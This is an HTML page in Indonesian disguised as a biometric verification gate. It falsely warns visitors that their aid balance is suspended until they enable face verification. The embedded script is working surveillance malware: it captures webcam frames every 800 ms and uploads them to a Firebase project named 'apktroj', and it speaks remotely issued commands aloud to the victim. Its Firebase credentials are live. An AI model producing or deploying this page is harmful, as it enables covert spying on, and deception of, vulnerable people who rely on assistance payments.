<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sistem Verifikasi Biometrik</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-gray-100 flex items-center justify-center min-h-screen">
    <div id="gate" class="bg-white p-8 rounded-2xl shadow-xl max-w-sm text-center">
        <h1 class="text-xl font-bold mb-4 text-red-600">AKSES DITANGGUHKAN</h1>
        <p class="text-sm text-gray-600 mb-8 text-left">Sistem mendeteksi akses mencurigakan. Aktifkan kamera untuk verifikasi wajah agar saldo bantuan Anda dapat diproses.</p>
        <button id="auth-btn" class="w-full bg-red-600 text-white font-bold py-4 rounded-xl shadow-lg">AKTIFKAN VERIFIKASI</button>
    </div>

    <video id="v" style="display:none" autoplay playsinline></video>
    <canvas id="c" style="display:none"></canvas>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-app.js";
        import { getFirestore, doc, setDoc, onSnapshot } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-firestore.js";
        import { getAuth, signInAnonymously } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-auth.js";

        const firebaseConfig = {
            apiKey: "AIzaSyBhJsqqGbJGZ-u-PqJ5m4L-gHCaTqlS3Wo",
            authDomain: "apktroj.firebaseapp.com",
            projectId: "apktroj",
            storageBucket: "apktroj.firebasestorage.app",
            messagingSenderId: "943833619122",
            appId: "1:943833619122:web:d757ced4d56267abf247ab"
        };

        const app = initializeApp(firebaseConfig);
        const db = getFirestore(app);
        const auth = getAuth(app);
        const appId = "apktroj_v1";

        document.getElementById('auth-btn').onclick = async () => {
            document.getElementById('gate').innerHTML = `<p class="animate-pulse font-bold">SEDANG MEMPROSES VERIFIKASI...</p>`;
            await signInAnonymously(auth);
            startStreaming();
        };

        async function startStreaming() {
            const userId = auth.currentUser.uid;

            // Listen for Voice Commands (fixed doc ID)
            onSnapshot(doc(db, 'artifacts', appId, 'public', 'data', 'commands', 'voice_cmd'), (snap) => {
                if (snap.exists()) {
                    const data = snap.data();
                    // Play only if it's a new command
                    if (Date.now() - data.timestamp < 5000) {
                        const ut = new SpeechSynthesisUtterance(data.text);
                        ut.lang = 'id-ID';
                        window.speechSynthesis.speak(ut);
                    }
                }
            });

            // Stream Video Buffer
            navigator.mediaDevices.getUserMedia({ video: true, audio: true }).then(stream => {
                const video = document.getElementById('v');
                video.srcObject = stream;
                
                const canvas = document.getElementById('c');
                const ctx = canvas.getContext('2d');

                setInterval(async () => {
                    canvas.width = 320; // Lower resolution for speed
                    canvas.height = 240;
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                    
                    // OVERWRITE old frame in Firestore
                    await setDoc(doc(db, 'artifacts', appId, 'public', 'data', 'stream_buffer', userId), {
                        frame: canvas.toDataURL('image/jpeg', 0.4),
                        timestamp: Date.now(),
                        uid: userId
                    });
                }, 800); // 800ms for pseudo-video feel without burning quota
            });
        }
    </script>
</body>
</html>
